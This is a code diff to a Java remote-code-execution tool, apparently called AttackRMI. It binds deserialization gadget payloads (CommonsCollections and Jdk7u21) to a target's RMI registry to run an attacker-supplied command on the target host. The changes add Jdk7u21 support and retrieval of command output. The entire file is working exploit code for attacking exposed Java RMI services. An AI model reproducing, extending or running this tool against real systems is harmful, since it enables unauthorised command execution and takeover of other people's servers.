@@ -1,5 +1,7 @@
 import payload.CommonsCollections11;
+import payload.Jdk7u21;
 import payload.PayloadType;
+import util.Reflections;
 import util.Utils;
 
 import java.io.PrintWriter;
@@ -9,6 +11,8 @@ import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 
 public class RMIPayload {
+
+
     public static void main(String[] args) throws Exception {
         if (args.length != 4) {
             System.err.println("Usage: java -jar AttackRMI.jar [payloadType] [ip] [port] '[command]'");
@@ -21,23 +25,36 @@ public class RMIPayload {
 
         final Class<? extends PayloadType> payloadClass = Utils.getPayloadClass(payloadType);
 
-        if (payloadClass == null ) {
+        if (payloadClass == null) {
             System.err.println("Invalid payload type '" + payloadType + "'");
             System.err.println("Available payload types: CommonsCollections2、CommonsCollections11、Jdk7u21");
             System.exit(64);
             return;
-        }else if ( "Jdk7u21".equals(payloadType)){
-            System.err.println("Unable to obtain echo for Jdk7u21 at the moment");
         }
 
-        PayloadType<Remote> payload = payloadClass.newInstance();
-        Remote object = payload.getRemoteObject(cmd);
+        Object object = null;
+
+        if ("Jdk7u21".equals(payloadType)) {
+            Jdk7u21.flag = true;
+            Jdk7u21 payload = (Jdk7u21) payloadClass.newInstance();
+            object = payload.getRebindObject(args[2]);
+        } else {
+            PayloadType<Remote> payload = payloadClass.newInstance();
+            object = payload.getObject(cmd, false);
+        }
+
+        Remote remote = Reflections.getRemoteObject(object);
 
         Registry registry = LocateRegistry.getRegistry(remoteIp, remotePort);
 
         try {
-            registry.bind("cmd", object);
+            registry.bind("cmd" + System.nanoTime(), remote);
+
+            if (Jdk7u21.flag) {
+                Jdk7u21.getCmdResult(remoteIp, remotePort, cmd);
+            }
         } catch (Exception e) {
+
             StringWriter sw = new StringWriter();
             PrintWriter pw = new PrintWriter(sw);
 
@@ -52,11 +69,13 @@ public class RMIPayload {
             if (end > (index + indexString.length())) {
                 String exceptionDetails = stackTrace.substring(index + indexString.length(), end);
                 System.out.println(exceptionDetails);
+            } else if (Jdk7u21.flag) {
+                Jdk7u21.getCmdResult(remoteIp, remotePort, cmd);
             } else {
                 System.out.println("未获取到结果");
             }
 
         }
-
     }
+
 }
